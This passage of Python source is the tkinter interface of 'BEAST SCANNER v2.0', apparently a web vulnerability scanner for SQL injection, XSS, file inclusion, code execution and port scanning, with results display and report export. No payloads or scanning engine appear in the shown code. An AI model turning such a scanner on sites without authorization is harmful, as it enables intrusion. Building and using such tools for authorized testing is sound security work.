        self.status_indicator = PulsingIndicator(status_frame, size=30, color=CyberTheme.NEON_GREEN)
        self.status_indicator.pack(side=tk.LEFT, padx=5)
        
        self.status_label = tk.Label(
            status_frame,
            text="READY",
            font=(CyberTheme.FONT_FAMILY, 12, "bold"),
            fg=CyberTheme.NEON_GREEN,
            bg=CyberTheme.BG_DARK
        )
        self.status_label.pack(side=tk.LEFT)
        
        # Separator
        separator = tk.Frame(self.main_container, height=2, bg=CyberTheme.NEON_GREEN)
        separator.pack(fill=tk.X, pady=5)
        
        # Target input section
        input_frame = tk.Frame(self.main_container, bg=CyberTheme.BG_MEDIUM, padx=20, pady=15)
        input_frame.pack(fill=tk.X, pady=(5, 10))
        
        tk.Label(
            input_frame,
            text="TARGET URL:",
            font=(CyberTheme.FONT_FAMILY, 11, "bold"),
            fg=CyberTheme.NEON_GREEN,
            bg=CyberTheme.BG_MEDIUM
        ).pack(side=tk.LEFT, padx=(0, 10))
        
        self.url_entry = tk.Entry(
            input_frame,
            textvariable=self.target_url,
            font=(CyberTheme.FONT_FAMILY, 12),
            fg=CyberTheme.NEON_GREEN,
            bg=CyberTheme.BG_DARK,
            insertbackground=CyberTheme.NEON_GREEN,
            relief=tk.FLAT,
            width=60
        )
        self.url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=10)
        self.url_entry.insert(0, "https://example.com")
        
        # Action buttons
        button_frame = tk.Frame(input_frame, bg=CyberTheme.BG_MEDIUM)
        button_frame.pack(side=tk.RIGHT)
        
        self.scan_btn = GlowButton(
            button_frame, 
            "⚡ START SCAN", 
            self.start_scan,
            color=CyberTheme.NEON_GREEN,
            width=140, 
            height=40
        )
        self.scan_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = GlowButton(
            button_frame, 
            "⬛ STOP", 
            self.stop_scan,
            color=CyberTheme.NEON_RED,
            width=100, 
            height=40
        )
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        self.export_btn = GlowButton(
            button_frame, 
            "📄 EXPORT", 
            self.export_results,
            color=CyberTheme.NEON_CYAN,
            width=100, 
            height=40
        )
        self.export_btn.pack(side=tk.LEFT, padx=5)
        
    def create_notebook(self):
        """Create tabbed interface"""
        self.notebook = ttk.Notebook(self.main_container)
        self.notebook.pack(fill=tk.BOTH, expand=True, pady=10)
        
        # Dashboard Tab
        self.dashboard_tab = tk.Frame(self.notebook, bg=CyberTheme.BG_DARK)
        self.notebook.add(self.dashboard_tab, text="  📊 DASHBOARD  ")
        self.create_dashboard()
        
        # Scanner Tab
        self.scanner_tab = tk.Frame(self.notebook, bg=CyberTheme.BG_DARK)
        self.notebook.add(self.scanner_tab, text="  🎯 SCANNER  ")
        self.create_scanner_tab()
        
        # Results Tab
        self.results_tab = tk.Frame(self.notebook, bg=CyberTheme.BG_DARK)
        self.notebook.add(self.results_tab, text="  📋 RESULTS  ")
        self.create_results_tab()
        
        # Console Tab
        self.console_tab = tk.Frame(self.notebook, bg=CyberTheme.BG_DARK)
        self.notebook.add(self.console_tab, text="  💻 CONSOLE  ")
        self.create_console_tab()
        
        # Settings Tab
        self.settings_tab = tk.Frame(self.notebook, bg=CyberTheme.BG_DARK)
        self.notebook.add(self.settings_tab, text="  ⚙️ SETTINGS  ")
        self.create_settings_tab()
        
    def create_dashboard(self):
        """Create dashboard with statistics"""
        # Statistics cards
        stats_frame = tk.Frame(self.dashboard_tab, bg=CyberTheme.BG_DARK)
        stats_frame.pack(fill=tk.X, pady=20, padx=20)
        
        # Create stat cards
        self.stat_cards = {}
        stats = [
            ("CRITICAL", "0", CyberTheme.CRITICAL),
            ("HIGH", "0", CyberTheme.HIGH),
            ("MEDIUM", "0", CyberTheme.MEDIUM),
            ("LOW", "0", CyberTheme.LOW),
            ("INFO", "0", CyberTheme.INFO),
            ("TOTAL", "0", CyberTheme.NEON_GREEN),
        ]
        
        for stat_name, stat_value, color in stats:
            card = self.create_stat_card(stats_frame, stat_name, stat_value, color)
            card.pack(side=tk.LEFT, padx=10, pady=10, fill=tk.BOTH, expand=True)
            self.stat_cards[stat_name] = card
            
        # Vulnerability chart area
        chart_frame = tk.Frame(self.dashboard_tab, bg=CyberTheme.BG_MEDIUM)
        chart_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        tk.Label(
            chart_frame,
            text="VULNERABILITY DISTRIBUTION",
            font=(CyberTheme.FONT_FAMILY, 14, "bold"),
            fg=CyberTheme.NEON_CYAN,
            bg=CyberTheme.BG_MEDIUM
        ).pack(pady=10)
        
        self.chart_canvas = tk.Canvas(
            chart_frame,
            bg=CyberTheme.BG_DARK,
            highlightthickness=0,
            height=300
        )
        self.chart_canvas.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        # Quick info panel
        info_frame = tk.Frame(self.dashboard_tab, bg=CyberTheme.BG_MEDIUM)
        info_frame.pack(fill=tk.X, padx=20, pady=10)
        
        self.scan_info_label = tk.Label(
            info_frame,
            text="No scan performed yet. Enter a target URL and click START SCAN.",
            font=(CyberTheme.FONT_FAMILY, 11),
            fg=CyberTheme.TEXT_SECONDARY,
            bg=CyberTheme.BG_MEDIUM
        )
        self.scan_info_label.pack(pady=15)
        
    def create_stat_card(self, parent, title, value, color):
        """Create a statistics card"""
        card = tk.Frame(parent, bg=CyberTheme.BG_CARD, padx=20, pady=15)
        
        # Border effect
        card.configure(highlightbackground=color, highlightthickness=2)
        
        tk.Label(
            card,
            text=title,
            font=(CyberTheme.FONT_FAMILY, 10),
            fg=CyberTheme.TEXT_SECONDARY,
            bg=CyberTheme.BG_CARD
        ).pack()
        
        value_label = tk.Label(
            card,
            text=value,
            font=(CyberTheme.FONT_FAMILY, 28, "bold"),
            fg=color,
            bg=CyberTheme.BG_CARD
        )
        value_label.pack()
        
        card.value_label = value_label
        return card
        
    def create_scanner_tab(self):
        """Create scanner options tab"""
        # Scan options
        options_frame = tk.Frame(self.scanner_tab, bg=CyberTheme.BG_MEDIUM, padx=20, pady=20)
        options_frame.pack(fill=tk.X, padx=20, pady=20)
        
        tk.Label(
            options_frame,
            text="SCAN OPTIONS",
            font=(CyberTheme.FONT_FAMILY, 14, "bold"),
            fg=CyberTheme.NEON_GREEN,
            bg=CyberTheme.BG_MEDIUM
        ).pack(anchor=tk.W, pady=(0, 15))
        
        # Scan type checkboxes
        self.scan_options = {}
        scan_types = [
            ("sql_injection", "SQL Injection", True),
            ("xss", "Cross-Site Scripting (XSS)", True),
            ("lfi", "Local File Inclusion", True),
            ("rce", "Remote Code Execution", True),
            ("ssti", "Server-Side Template Injection", True),
            ("open_redirect", "Open Redirect", True),
            ("directories", "Directory Enumeration", True),
            ("sensitive_files", "Sensitive File Detection", True),
            ("headers", "Security Headers Analysis", True),
            ("ssl", "SSL/TLS Analysis", True),
            ("cors", "CORS Misconfiguration", True),
            ("cookies", "Cookie Security Analysis", True),
            ("ports", "Port Scanning", False),
            ("technologies", "Technology Detection", True),
        ]
        
        # Create two columns
        left_frame = tk.Frame(options_frame, bg=CyberTheme.BG_MEDIUM)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        right_frame = tk.Frame(options_frame, bg=CyberTheme.BG_MEDIUM)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        
        for i, (key, label, default) in enumerate(scan_types):
            var = tk.BooleanVar(value=default)
            self.scan_options[key] = var
            
            frame = left_frame if i < len(scan_types) // 2 else right_frame
            
            cb = tk.Checkbutton(
                frame,
                text=label,
                variable=var,
                font=(CyberTheme.FONT_FAMILY, 10),
                fg=CyberTheme.TEXT_PRIMARY,
                bg=CyberTheme.BG_MEDIUM,
                selectcolor=CyberTheme.BG_DARK,
                activebackground=CyberTheme.BG_MEDIUM,
                activeforeground=CyberTheme.NEON_GREEN
            )
            cb.pack(anchor=tk.W, pady=3)
            
        # Quick select buttons
        btn_frame = tk.Frame(options_frame, bg=CyberTheme.BG_MEDIUM)
        btn_frame.pack(fill=tk.X, pady=(20, 0))
        
        GlowButton(
            btn_frame, "SELECT ALL", self.select_all_options,
            color=CyberTheme.NEON_CYAN, width=120, height=35
        ).pack(side=tk.LEFT, padx=5)
        
        GlowButton(
            btn_frame, "DESELECT ALL", self.deselect_all_options,
            color=CyberTheme.NEON_ORANGE, width=120, height=35
        ).pack(side=tk.LEFT, padx=5)
        
        # Advanced options
        advanced_frame = tk.Frame(self.scanner_tab, bg=CyberTheme.BG_MEDIUM, padx=20, pady=20)
        advanced_frame.pack(fill=tk.X, padx=20, pady=10)
        
        tk.Label(
            advanced_frame,
            text="ADVANCED OPTIONS",
            font=(CyberTheme.FONT_FAMILY, 14, "bold"),
            fg=CyberTheme.NEON_GREEN,
            bg=CyberTheme.BG_MEDIUM
        ).pack(anchor=tk.W, pady=(0, 15))
        
        # Timeout setting
        timeout_frame = tk.Frame(advanced_frame, bg=CyberTheme.BG_MEDIUM)
        timeout_frame.pack(fill=tk.X, pady=5)
        
        tk.Label(
            timeout_frame,
            text="Request Timeout (seconds):",
            font=(CyberTheme.FONT_FAMILY, 10),
            fg=CyberTheme.TEXT_PRIMARY,
            bg=CyberTheme.BG_MEDIUM
        ).pack(side=tk.LEFT)
        
        self.timeout_var = tk.StringVar(value="10")
        timeout_entry = tk.Entry(
            timeout_frame,
            textvariable=self.timeout_var,
            font=(CyberTheme.FONT_FAMILY, 10),
            fg=CyberTheme.NEON_GREEN,
            bg=CyberTheme.BG_DARK,
            width=10,
            insertbackground=CyberTheme.NEON_GREEN
        )
        timeout_entry.pack(side=tk.LEFT, padx=10)
        
        # Thread count
        thread_frame = tk.Frame(advanced_frame, bg=CyberTheme.BG_MEDIUM)
        thread_frame.pack(fill=tk.X, pady=5)
        
        tk.Label(
            thread_frame,
            text="Thread Count:",
            font=(CyberTheme.FONT_FAMILY, 10),
            fg=CyberTheme.TEXT_PRIMARY,
            bg=CyberTheme.BG_MEDIUM
        ).pack(side=tk.LEFT)
        
        self.thread_var = tk.StringVar(value="20")
        thread_entry = tk.Entry(
            thread_frame,
            textvariable=self.thread_var,
            font=(CyberTheme.FONT_FAMILY, 10),
            fg=CyberTheme.NEON_GREEN,
            bg=CyberTheme.BG_DARK,
            width=10,
            insertbackground=CyberTheme.NEON_GREEN
        )
        thread_entry.pack(side=tk.LEFT, padx=10)
        
    def create_results_tab(self):
        """Create results display tab"""
        # Filter frame
        filter_frame = tk.Frame(self.results_tab, bg=CyberTheme.BG_MEDIUM, padx=10, pady=10)
        filter_frame.pack(fill=tk.X, padx=20, pady=(20, 10))
        
        tk.Label(
            filter_frame,
            text="FILTER BY SEVERITY:",
            font=(CyberTheme.FONT_FAMILY, 10, "bold"),
            fg=CyberTheme.NEON_GREEN,
            bg=CyberTheme.BG_MEDIUM
        ).pack(side=tk.LEFT, padx=(0, 10))
        
        self.filter_var = tk.StringVar(value="ALL")
        filters = ["ALL", "CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]
        
        for f in filters:
            rb = tk.Radiobutton(
                filter_frame,
                text=f,
                variable=self.filter_var,
                value=f,
                font=(CyberTheme.FONT_FAMILY, 9),
                fg=CyberTheme.TEXT_PRIMARY,
                bg=CyberTheme.BG_MEDIUM,
                selectcolor=CyberTheme.BG_DARK,
                activebackground=CyberTheme.BG_MEDIUM,
                command=self.filter_results
            )
            rb.pack(side=tk.LEFT, padx=5)
            
        # Results tree
        tree_frame = tk.Frame(self.results_tab, bg=CyberTheme.BG_DARK)
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        # Create Treeview with custom style
        style = ttk.Style()
        style.configure("Vuln.Treeview",
                       background=CyberTheme.BG_DARK,
                       foreground=CyberTheme.TEXT_PRIMARY,
                       fieldbackground=CyberTheme.BG_DARK,
                       font=(CyberTheme.FONT_FAMILY, 10))
        style.configure("Vuln.Treeview.Heading",
                       background=CyberTheme.BG_MEDIUM,
                       foreground=CyberTheme.NEON_GREEN,
                       font=(CyberTheme.FONT_FAMILY, 10, "bold"))
        
        columns = ("severity", "type", "url", "details")
        self.results_tree = ttk.Treeview(
            tree_frame,
            columns=columns,
            show="headings",
            style="Vuln.Treeview"
        )
        
        self.results_tree.heading("severity", text="SEVERITY")
        self.results_tree.heading("type", text="TYPE")
        self.results_tree.heading("url", text="URL")
        self.results_tree.heading("details", text="DETAILS")
        
        self.results_tree.column("severity", width=100, minwidth=80)
        self.results_tree.column("type", width=200, minwidth=150)
        self.results_tree.column("url", width=300, minwidth=200)
        self.results_tree.column("details", width=400, minwidth=200)
        
        # Scrollbars
        y_scroll = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.results_tree.yview)
        x_scroll = ttk.Scrollbar(tree_frame, orient=tk.HORIZONTAL, command=self.results_tree.xview)
        self.results_tree.configure(yscrollcommand=y_scroll.set, xscrollcommand=x_scroll.set)
        
        self.results_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        y_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Detail view
        detail_frame = tk.Frame(self.results_tab, bg=CyberTheme.BG_MEDIUM, padx=10, pady=10)
        detail_frame.pack(fill=tk.X, padx=20, pady=10)
        
        tk.Label(
            detail_frame,
            text="VULNERABILITY DETAILS",
            font=(CyberTheme.FONT_FAMILY, 12, "bold"),
            fg=CyberTheme.NEON_GREEN,
            bg=CyberTheme.BG_MEDIUM
        ).pack(anchor=tk.W)
        
        self.detail_text = scrolledtext.ScrolledText(
            detail_frame,
            height=8,
            font=(CyberTheme.FONT_FAMILY, 10),
            fg=CyberTheme.NEON_GREEN,
            bg=CyberTheme.BG_DARK,
            insertbackground=CyberTheme.NEON_GREEN
        )
        self.detail_text.pack(fill=tk.X, pady=10)
        
        self.results_tree.bind("<<TreeviewSelect>>", self.on_result_select)
        
    def create_console_tab(self):
        """Create console output tab"""
        console_frame = tk.Frame(self.console_tab, bg=CyberTheme.BG_DARK)
        console_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Console header
        header = tk.Frame(console_frame, bg=CyberTheme.BG_MEDIUM)
        header.pack(fill=tk.X)
        
        tk.Label(
            header,
            text="  BEAST SCANNER CONSOLE  ",
            font=(CyberTheme.FONT_FAMILY, 12, "bold"),
            fg=CyberTheme.NEON_GREEN,
            bg=CyberTheme.BG_MEDIUM
        ).pack(side=tk.LEFT, pady=5)
        
        GlowButton(
            header, "CLEAR", self.clear_console,
            color=CyberTheme.NEON_ORANGE, width=80, height=30
        ).pack(side=tk.RIGHT, padx=5, pady=5)
        
        # Console output
        self.console = scrolledtext.ScrolledText(
            console_frame,
            font=(CyberTheme.FONT_FAMILY, 10),
            fg=CyberTheme.NEON_GREEN,
            bg=CyberTheme.BG_DARK,
            insertbackground=CyberTheme.NEON_GREEN,
            state=tk.DISABLED
        )
        self.console.pack(fill=tk.BOTH, expand=True, pady=(5, 0))
        
        # Configure tags for different message types
        self.console.tag_config("INFO", foreground=CyberTheme.INFO)
        self.console.tag_config("WARNING", foreground=CyberTheme.WARNING)
        self.console.tag_config("ERROR", foreground=CyberTheme.ERROR)
        self.console.tag_config("CRITICAL", foreground=CyberTheme.CRITICAL)
        self.console.tag_config("HIGH", foreground=CyberTheme.HIGH)
        self.console.tag_config("MEDIUM", foreground=CyberTheme.MEDIUM)
        self.console.tag_config("LOW", foreground=CyberTheme.LOW)
        self.console.tag_config("SUCCESS", foreground=CyberTheme.SUCCESS)
        
    def create_settings_tab(self):
        """Create settings tab"""
        settings_frame = tk.Frame(self.settings_tab, bg=CyberTheme.BG_MEDIUM, padx=30, pady=30)
        settings_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        tk.Label(
            settings_frame,
            text="SCANNER SETTINGS",
            font=(CyberTheme.FONT_FAMILY, 16, "bold"),
            fg=CyberTheme.NEON_GREEN,
            bg=CyberTheme.BG_MEDIUM
        ).pack(anchor=tk.W, pady=(0, 20))
        
        # User Agent setting
        ua_frame = tk.Frame(settings_frame, bg=CyberTheme.BG_MEDIUM)
        ua_frame.pack(fill=tk.X, pady=10)
        
        tk.Label(
            ua_frame,
            text="User-Agent:",
            font=(CyberTheme.FONT_FAMILY, 11),
            fg=CyberTheme.TEXT_PRIMARY,
            bg=CyberTheme.BG_MEDIUM
        ).pack(anchor=tk.W)
        
        self.user_agent_var = tk.StringVar(
            value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        )
        ua_entry = tk.Entry(
            ua_frame,
            textvariable=self.user_agent_var,
            font=(CyberTheme.FONT_FAMILY, 10),
            fg=CyberTheme.NEON_GREEN,
            bg=CyberTheme.BG_DARK,
            insertbackground=CyberTheme.NEON_GREEN,
            width=80
        )
        ua_entry.pack(fill=tk.X, pady=5)
        
        # Proxy setting
        proxy_frame = tk.Frame(settings_frame, bg=CyberTheme.BG_MEDIUM)
        proxy_frame.pack(fill=tk.X, pady=10)
        
        tk.Label(
            proxy_frame,
            text="Proxy (optional):",
            font=(CyberTheme.FONT_FAMILY, 11),
            fg=CyberTheme.TEXT_PRIMARY,
            bg=CyberTheme.BG_MEDIUM
        ).pack(anchor=tk.W)
        
        self.proxy_var = tk.StringVar()
        proxy_entry = tk.Entry(
            proxy_frame,
            textvariable=self.proxy_var,
            font=(CyberTheme.FONT_FAMILY, 10),
            fg=CyberTheme.NEON_GREEN,
            bg=CyberTheme.BG_DARK,
            insertbackground=CyberTheme.NEON_GREEN,
            width=50
        )
        proxy_entry.pack(anchor=tk.W, pady=5)
        proxy_entry.insert(0, "http://127.0.0.1:8080")
        
        # Custom headers
        headers_frame = tk.Frame(settings_frame, bg=CyberTheme.BG_MEDIUM)
        headers_frame.pack(fill=tk.X, pady=10)
        
        tk.Label(
            headers_frame,
            text="Custom Headers (JSON format):",
            font=(CyberTheme.FONT_FAMILY, 11),
            fg=CyberTheme.TEXT_PRIMARY,
            bg=CyberTheme.BG_MEDIUM
        ).pack(anchor=tk.W)
        
        self.headers_text = scrolledtext.ScrolledText(
            headers_frame,
            height=5,
            font=(CyberTheme.FONT_FAMILY, 10),
            fg=CyberTheme.NEON_GREEN,
            bg=CyberTheme.BG_DARK,
            insertbackground=CyberTheme.NEON_GREEN
        )
        self.headers_text.pack(fill=tk.X, pady=5)
        self.headers_text.insert("1.0", '{\n  "Authorization": "Bearer <token>"\n}')
        
        # Save button
        GlowButton(
            settings_frame, "SAVE SETTINGS", self.save_settings,
            color=CyberTheme.NEON_GREEN, width=150, height=40
        ).pack(pady=20)
        
    def create_status_bar(self):
        """Create status bar at bottom"""
        self.status_bar = tk.Frame(self.main_container, bg=CyberTheme.BG_MEDIUM, height=30)
        self.status_bar.pack(fill=tk.X, side=tk.BOTTOM)
        
        self.progress = ttk.Progressbar(
            self.status_bar,
            style="Cyber.Horizontal.TProgressbar",
            mode="indeterminate"
        )
        self.progress.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=10, pady=5)
        
        self.progress_label = tk.Label(
            self.status_bar,
            text="Ready",
            font=(CyberTheme.FONT_FAMILY, 9),
            fg=CyberTheme.TEXT_SECONDARY,
            bg=CyberTheme.BG_MEDIUM
        )
        self.progress_label.pack(side=tk.RIGHT, padx=10)
        
    def animate_startup(self):
        """Startup animation"""
        self.log_console("=" * 60, "SUCCESS")
        self.log_console("  BEAST SCANNER v2.0 - Advanced Web Vulnerability Scanner", "SUCCESS")
        self.log_console("  Developed for Authorized Penetration Testing", "SUCCESS")
        self.log_console("=" * 60, "SUCCESS")
        self.log_console("", "INFO")
        self.log_console("[*] System initialized successfully", "INFO")
        self.log_console("[*] All modules loaded", "INFO")
        self.log_console("[*] Ready for scanning...", "SUCCESS")
        self.log_console("", "INFO")
        
    def log_console(self, message, level="INFO"):
        """Log message to console"""
        self.console.config(state=tk.NORMAL)
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.console.insert(tk.END, f"[{timestamp}] ", "INFO")
        self.console.insert(tk.END, f"{message}\n", level)
        self.console.see(tk.END)
        self.console.config(state=tk.DISABLED)
        
    def start_scan(self):
        """Start vulnerability scan"""
        if self.scan_running:
            messagebox.showwarning("Warning", "Scan already in progress!")
            return
            
        url = self.target_url.get().strip()
        if not url:
            messagebox.showerror("Error", "Please enter a target URL")
            return
            
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
            self.target_url.set(url)
            
        self.scan_running = True
        self.status_label.config(text="SCANNING", fg=CyberTheme.NEON_ORANGE)
        self.status_indicator.start_pulse()
        self.progress.start()
        
        # Clear previous results
        for item in self.results_tree.get_children():
            self.results_tree.delete(item)
            
        # Reset stats
        for stat in self.stat_cards.values():
            stat.value_label.config(text="0")
            
        # Start scan in background thread
        scan_thread = threading.Thread(target=self.run_scan, args=(url,))
        scan_thread.daemon = True
        scan_thread.start()
        
    def run_scan(self, url):
        """Run the vulnerability scan"""
        try:
            self.scanner = VulnerabilityScanner(callback=self.log_console)
            vulnerabilities = self.scanner.full_scan(url)
            
            # Update results in main thread
            self.root.after(0, lambda: self.display_results(vulnerabilities))
            
        except Exception as e:
            self.root.after(0, lambda: self.log_console(f"[!] Scan error: {str(e)}", "ERROR"))
            
        finally:
            self.root.after(0, self.scan_complete)
            
    def scan_complete(self):
        """Handle scan completion"""
        self.scan_running = False
        self.status_label.config(text="COMPLETE", fg=CyberTheme.NEON_GREEN)
        self.status_indicator.stop_pulse()
        self.progress.stop()
        self.progress_label.config(text="Scan complete")
        
    def stop_scan(self):
        """Stop current scan"""
        if self.scan_running:
            self.scan_running = False
            self.status_label.config(text="STOPPED", fg=CyberTheme.NEON_RED)
            self.status_indicator.stop_pulse()
            self.progress.stop()
            self.log_console("[!] Scan stopped by user", "WARNING")
            
    def display_results(self, vulnerabilities):
        """Display scan results"""
        stats = defaultdict(int)
        
        for vuln in vulnerabilities:
            severity = vuln["severity"]
            stats[severity] += 1
            stats["TOTAL"] += 1
            
            # Add to tree
            self.results_tree.insert("", tk.END, values=(
                severity,
                vuln["type"],
                vuln["url"][:50] + "..." if len(vuln["url"]) > 50 else vuln["url"],
                vuln["details"][:50] + "..." if len(vuln["details"]) > 50 else vuln["details"]
            ), tags=(severity,))
            
        # Configure row colors
        self.results_tree.tag_configure("CRITICAL", foreground=CyberTheme.CRITICAL)
        self.results_tree.tag_configure("HIGH", foreground=CyberTheme.HIGH)
        self.results_tree.tag_configure("MEDIUM", foreground=CyberTheme.MEDIUM)
        self.results_tree.tag_configure("LOW", foreground=CyberTheme.LOW)
        self.results_tree.tag_configure("INFO", foreground=CyberTheme.INFO)
        
        # Update stat cards
        for stat_name, card in self.stat_cards.items():
            value = stats.get(stat_name, 0)
            card.value_label.config(text=str(value))
            
        # Update chart
        self.draw_chart(stats)
        
        # Update info label
        self.scan_info_label.config(
            text=f"Scan completed. Found {stats['TOTAL']} vulnerabilities. "
                 f"Critical: {stats['CRITICAL']}, High: {stats['HIGH']}, "
                 f"Medium: {stats['MEDIUM']}, Low: {stats['LOW']}"
        )
        
    def draw_chart(self, stats):
        """Draw vulnerability chart"""
        self.chart_canvas.delete("all")
        
        width = self.chart_canvas.winfo_width()
        height = self.chart_canvas.winfo_height()
        
        if width < 100:
            width = 600
        if height < 100:
            height = 300
            
        # Bar chart
        categories = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]
        colors = [CyberTheme.CRITICAL, CyberTheme.HIGH, CyberTheme.MEDIUM, 
                 CyberTheme.LOW, CyberTheme.INFO]
        
        max_val = max(stats.values()) if stats else 1
        bar_width = 60
        spacing = 40
        start_x = (width - (len(categories) * (bar_width + spacing))) // 2
        
        for i, (cat, color) in enumerate(zip(categories, colors)):
            value = stats.get(cat, 0)
            bar_height = (value / max_val) * (height - 100) if max_val > 0 else 0
            
            x1 = start_x + i * (bar_width + spacing)
            y1 = height - 50 - bar_height
            x2 = x1 + bar_width
            y2 = height - 50
            
            # Draw bar
            self.chart_canvas.create_rectangle(
                x1, y1, x2, y2,
                fill=color, outline=color
            )
            
            # Draw value
            self.chart_canvas.create_text(
                x1 + bar_width // 2, y1 - 15,
                text=str(value),
                fill=color,
                font=(CyberTheme.FONT_FAMILY, 12, "bold")
            )
            
            # Draw label
            self.chart_canvas.create_text(
                x1 + bar_width // 2, y2 + 20,
                text=cat,
                fill=CyberTheme.TEXT_SECONDARY,
                font=(CyberTheme.FONT_FAMILY, 9)
            )
            
    def on_result_select(self, event):
        """Handle result selection"""
        selection = self.results_tree.selection()
        if not selection:
            return
            
        item = self.results_tree.item(selection[0])
        values = item["values"]
        
        if self.scanner and self.scanner.vulnerabilities:
            for vuln in self.scanner.vulnerabilities:
                if vuln["type"] in values[1]:
                    self.detail_text.delete("1.0", tk.END)
                    detail = f"""
Vulnerability Type: {vuln['type']}
Severity: {vuln['severity']}
URL: {vuln['url']}

Details:
{vuln['details']}

Evidence:
{vuln['evidence']}

Timestamp: {vuln['timestamp']}
"""
                    self.detail_text.insert("1.0", detail)
                    break
                    
    def filter_results(self):
        """Filter results by severity"""
        filter_val = self.filter_var.get()
        
        for item in self.results_tree.get_children():
            self.results_tree.delete(item)
            
        if self.scanner and self.scanner.vulnerabilities:
            for vuln in self.scanner.vulnerabilities:
                if filter_val == "ALL" or vuln["severity"] == filter_val:
                    self.results_tree.insert("", tk.END, values=(
                        vuln["severity"],
                        vuln["type"],
                        vuln["url"][:50] + "..." if len(vuln["url"]) > 50 else vuln["url"],
                        vuln["details"][:50] + "..." if len(vuln["details"]) > 50 else vuln["details"]
                    ), tags=(vuln["severity"],))
                    
    def export_results(self):
        """Export results to file"""
        if not self.scanner or not self.scanner.vulnerabilities:
            messagebox.showwarning("Warning", "No results to export")
            return
            
        filename = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[
                ("JSON files", "*.json"),
                ("HTML files", "*.html"),
                ("Text files", "*.txt")
            ]
        )
        
        if not filename:
            return
            
        try:
            if filename.endswith(".json"):
                with open(filename, "w") as f:
                    json.dump({
                        "target": self.target_url.get(),
                        "scan_time": datetime.now().isoformat(),
                        "vulnerabilities": self.scanner.vulnerabilities
                    }, f, indent=2)
                    
            elif filename.endswith(".html"):
                self.export_html(filename)
                
            else:
                with open(filename, "w") as f:
                    f.write(f"BEAST SCANNER Report\n")
                    f.write(f"Target: {self.target_url.get()}\n")
                    f.write(f"Time: {datetime.now().isoformat()}\n")
                    f.write("=" * 60 + "\n\n")
                    
                    for vuln in self.scanner.vulnerabilities:
                        f.write(f"[{vuln['severity']}] {vuln['type']}\n")
                        f.write(f"URL: {vuln['url']}\n")
                        f.write(f"Details: {vuln['details']}\n")
                        f.write(f"Evidence: {vuln['evidence']}\n")
                        f.write("-" * 40 + "\n\n")
                        
            messagebox.showinfo("Success", f"Results exported to {filename}")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to export: {str(e)}")
            
    def export_html(self, filename):
        """Export results as HTML report"""
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>BEAST SCANNER Report</title>
    <style>
        body {{ background: #0a0a0f; color: #fff; font-family: 'Consolas', monospace; padding: 20px; }}
        h1 {{ color: #00ff41; }}
        h2 {{ color: #00d4ff; }}
        .vuln {{ background: #1a1a2e; padding: 15px; margin: 10px 0; border-left: 4px solid; }}
        .CRITICAL {{ border-color: #ff0040; }}
        .HIGH {{ border-color: #ff6600; }}
        .MEDIUM {{ border-color: #ffff00; }}
        .LOW {{ border-color: #00d4ff; }}
        .INFO {{ border-color: #8892b0; }}
        .severity {{ font-weight: bold; }}
        .stats {{ display: flex; gap: 20px; margin: 20px 0; }}
        .stat {{ background: #16213e; padding: 20px; text-align: center; }}
        .stat-value {{ font-size: 32px; font-weight: bold; }}
    </style>
</head>
<body>
    <h1>🔥 BEAST SCANNER Report</h1>
    <p>Target: {self.target_url.get()}</p>
    <p>Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    
    <div class="stats">
"""
        
        stats = defaultdict(int)
        for vuln in self.scanner.vulnerabilities:
            stats[vuln["severity"]] += 1
            
        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            html += f'<div class="stat {sev}"><div class="stat-value">{stats[sev]}</div><div>{sev}</div></div>'
            
        html += """
    </div>
    
    <h2>Vulnerabilities</h2>
"""
        
        for vuln in self.scanner.vulnerabilities:
            html += f"""
    <div class="vuln {vuln['severity']}">
        <div class="severity">[{vuln['severity']}] {vuln['type']}</div>
        <div>URL: {vuln['url']}</div>
        <div>Details: {vuln['details']}</div>
        <div>Evidence: {vuln['evidence']}</div>
    </div>
"""
            
        html += """
</body>
</html>
"""
        
        with open(filename, "w") as f:
            f.write(html)
            
    def clear_console(self):
        """Clear console output"""
        self.console.config(state=tk.NORMAL)
        self.console.delete("1.0", tk.END)
        self.console.config(state=tk.DISABLED)
        
    def select_all_options(self):
        """Select all scan options"""
        for var in self.scan_options.values():
            var.set(True)
            
    def deselect_all_options(self):
        """Deselect all scan options"""
        for var in self.scan_options.values():
            var.set(False)
            
    def save_settings(self):
        """Save settings"""
        messagebox.showinfo("Settings", "Settings saved successfully!")
        
    def run(self):
        """Run the application"""
        self.root.mainloop()


def main():
    """Main entry point"""
    print("""
    ██████╗ ███████╗ █████╗ ███████╗████████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
    ██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
    ██████╔╝█████╗  ███████║███████╗   ██║       ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
    ██╔══██╗██╔══╝  ██╔══██║╚════██║   ██║       ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
